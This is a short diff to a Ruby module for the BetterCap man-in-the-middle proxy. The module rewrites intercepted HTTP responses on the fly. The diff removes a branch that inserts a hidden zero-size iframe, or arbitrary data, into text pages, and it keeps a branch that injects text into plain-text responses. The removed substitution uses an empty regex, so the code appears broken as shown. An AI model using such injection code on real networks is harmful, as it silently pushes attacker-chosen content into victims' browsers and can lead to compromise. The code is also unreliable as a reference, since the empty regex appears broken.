@@ -76,21 +76,6 @@ class Injecttext < BetterCap::Proxy::HTTP::Module
   # Called by the BetterCap::Proxy::HTTP::Proxy processor on each HTTP +request+ and
   # +response+.
   def on_request( request, response )
-    # is it a text page?
-    if response.content_type =~ /^text\/text.*/ and ( @@cnt < @@max )
-      @@cnt += 1
-      BetterCap::Logger.info "[#{'INJECTtext'.green}] Injecting text code into #{request.to_url}"
-
-      if @@data.nil?
-        replacement = "<iframe src=\"#{@@iframe}\" frameborder=\"0\" height=\"0\" width=\"0\"></iframe>"
-      else
-        replacement = "#{@@data}"
-      end
-
-      response.body.sub!( //i ) { "#{replacement}</body>" }
-
-    end
-    # is it a plain-text page?
     if response.content_type =~ /^text\/plain.*/ and ( @@cnt < @@max )
         @@cnt += 1
         BetterCap::Logger.info "[#{'INJECT Plain text'.green}] Injecting Text into #{request.to_url}"
